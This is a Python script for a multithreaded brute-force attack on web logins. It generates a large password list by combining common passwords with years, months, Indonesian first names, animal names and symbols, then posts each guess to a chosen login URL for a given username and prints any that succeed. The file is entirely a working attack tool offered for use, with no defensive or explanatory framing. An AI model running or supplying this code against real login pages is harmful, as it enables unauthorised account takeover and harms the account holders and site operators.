import argparse
import requests
import random
import threading
from lib.humanName import HumanNames
from lib.nameOfMonth import MonthNames
from lib.animal import AnimalList

class BaseText:
    dict = ["admin", "itadmin", "administrator", "theadmins", "admins", "me", 
            "password", "123456", "qwerty", "abc123", "letmein", "welcome", 
            "monkey", "12345", "123456789", "sunshine", "iloveyou"]
    years = range(1945, 2025)
    months = range(1, 13)  
    symbols = ["#", "@", "!", "$", "/", "*", "&", "^", "+", "^", "~", "?"]

def generate_passwords():
    passwords = []
    TheText = BaseText.dict
    years = BaseText.years
    months = BaseText.months  
    symbols = BaseText.symbols
    NamaCowok = HumanNames.get_names("indonesian", "male")
    NamaCewek = HumanNames.get_names("indonesian", "female")
    month_names = MonthNames().months["en"]
    HewanInstance = AnimalList()
    Hewan = HewanInstance.get_animals()

    random_numbers = [str(random.randint(100, 999)) for _ in range(10)]

    def add_variations(base):
        return [
            base,  
            base.lower(),
            base.upper(),
            base.capitalize(),
            ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(base)])
        ]

    for text in TheText:
        variations = add_variations(text)

        for variant in variations:
            for year in years:
                for symbol in symbols:
                    passwords.append(f"{variant}{symbol}{year}")
                    passwords.append(f"{year}{symbol}{variant}")
                    passwords.append(f"{symbol}{variant}{year}")
                    passwords.append(f"{variant}{year}{symbol}")

                for month in months:
                    month_name = month_names[month - 1]  
                    passwords.append(f"{variant}{symbol}{month}")
                    passwords.append(f"{month}{symbol}{variant}")
                    passwords.append(f"{symbol}{variant}{month}")
                    passwords.append(f"{variant}{month}{symbol}")
                    passwords.append(f"{variant}{symbol}{month_name}")
                    passwords.append(f"{month_name}{symbol}{variant}")
                    passwords.append(f"{symbol}{variant}{month_name}")
                    passwords.append(f"{variant}{month_name}{symbol}")

            for name in NamaCowok + NamaCewek:
                for symbol in symbols:
                    passwords.append(f"{variant}{symbol}{name}")
                    passwords.append(f"{name}{symbol}{variant}")
                    passwords.append(f"{symbol}{variant}{name}")
                    passwords.append(f"{variant}{name}{symbol}")

            for animal in Hewan:
                for symbol in symbols:
                    passwords.append(f"{variant}{symbol}{animal}")
                    passwords.append(f"{animal}{symbol}{variant}")
                    passwords.append(f"{symbol}{variant}{animal}")
                    passwords.append(f"{variant}{animal}{symbol}")

            for number in random_numbers:
                passwords.append(f"{variant}{number}")
                passwords.append(f"{variant}{number}{random.choice(symbols)}")
                passwords.append(f"{number}{variant}")
                passwords.append(f"{variant}{random.choice(symbols)}{number}")

            passwords.append(variant)

    return list(set(passwords))


def attempt_login(url, username, password):
    try:
        response = requests.post(url, data={'username': username, 'password': password}, timeout=5)
        if response.ok: 
            print(f"Success: Username: {username}, Password: {password}")
            return password  
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    return None

def login_worker(url, username, passwords, results):
    for password in passwords:
        if attempt_login(url, username, password):
            results.append(password)
            break

def main():
    parser = argparse.ArgumentParser(description="Advanced brute-force login credential checker")
    parser.add_argument('--url', required=True, help='The login URL')
    parser.add_argument('--username', required=True, help='Username or email to login')
    parser.add_argument('--thread', type=int, default=1, help='Number of threads to use')

    args = parser.parse_args()

    generated_passwords = generate_passwords()
    url = args.url
    username = args.username
    num_threads = args.thread

    chunk_size = len(generated_passwords) // num_threads
    threads = []
    results = []

    for i in range(num_threads):
        start_index = i * chunk_size
        end_index = (i + 1) * chunk_size if i < num_threads - 1 else len(generated_passwords)
        thread = threading.Thread(target=login_worker, args=(url, username, generated_passwords[start_index:end_index], results))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if results:
        print(f"Password(s) found: {', '.join(results)}")
    else:
        print("No valid passwords found.")

if __name__ == "__main__":
    main()
